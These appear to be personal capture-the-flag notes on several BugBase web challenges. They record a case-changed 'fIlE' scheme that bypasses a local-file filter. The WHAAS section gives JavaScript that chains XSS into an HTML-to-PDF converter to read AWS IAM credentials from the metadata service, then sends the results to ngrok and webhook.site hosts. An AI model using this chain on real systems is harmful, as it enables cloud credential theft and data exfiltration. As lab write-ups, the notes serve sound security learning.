
### Source Code Viewer
__Challenge Question__
During one of our pentest engagement, we have found a client's web app where you can check source code of other websites. However, we're unable to exploit it further. Can you help us? P.S: As a proof of concept, the client is asking us to get the password of their employee "tuhin1729" & wrap it inside BugBase{}. For example, if the password is "1234567890", the flag will be BugBase{1234567890}

__Challenge Links__
http://165.232.190.5:8081/

__Hints__
1.  They said he is using a very weak password.
2. The dark figure cast upon a surface by a body intercepting the rays from a source of light,...etc.

#### Notes
`Server: Werkzeug/2.3.0 Python/3.8.16`
- `curl` is used
- Possible attacks: LFI, Command Injection, SSRF

__Test LFI__
- HTTP/HTTPS protocol is appended by default
- file, ftp is blocked
- JHaddix list did not work
- ___File protocol case-changed worked!___ - `fIlE`

__Test Command Injection__
- Used seclists -> did not work

__Test SSRF__
- Port number enumerated -> 8081
- Paths enumerated -> Nothing
- DNS rebind -> Nope
- Shell shock -> Nope

---
### BugBase Employee Directory


---
### WHAAS
__Challenge Question__
We've made a simple application for generating welcome messages for hackers. Feel free to report any bugs you encounter

__Challenge Links__
http://54.180.108.161/

__Hints__
1. Flag is in our secret file storage.
2. Flag is in the s3 bucket
3. Admin has a secret interface for internal works. However, only admin can see this.
4. Data about data

#### Notes
__Endpoints__
- /?alias=XSS
- /bugs
- /admin - 403

___XSS->PDF->AWS___
```javascript
// /?alias=<scrscriptipt src="https://1fc3-122-164-175-43.in.ngrok.io/hack.js"></scrscriptipt>

// step 2

const htmlCode = "<iframe src='http://169.254.169.254/latest/meta-data/iam/security-credentials/bugbase-sales-team' width='1000px' height='1000px'></iframe>";
const xhr = new XMLHttpRequest();
xhr.open("POST", "/admin/convert");
xhr.setRequestHeader("Content-Type", "application/json");
xhr.onload = function() {
        if (xhr.status === 200) {
                const response = JSON.parse(xhr.responseText);
                fetch("https://webhook.site/01bcd1d7-0732-4cf2-a6f9-3a7056d8bdee", {
                    method: "POST",
                    body: response.pdfLink
                })
        }
};
xhr.send(JSON.stringify({htmlCode: htmlCode}));

// step 1
// fetch("/admin")
//     .then(
//         data => data.text()
//     )
//     .then(admin => {
//         // fetch("https://c017-122-164-175-43.in.ngrok.io/?" + JSON.stringify(admin))
//         fetch("https://webhook.site/01bcd1d7-0732-4cf2-a6f9-3a7056d8bdee", {
//             method: "POST",
//             body: JSON.stringify(admin)
//         })
//     })
```

---
### Ping Pong
__Challenge Question__
Let's play a game of ping pong: nc 165.232.190.5 1340

__Challenge Links__
https://pastebin.com/Ai0ZYSvb

#### Notes
- 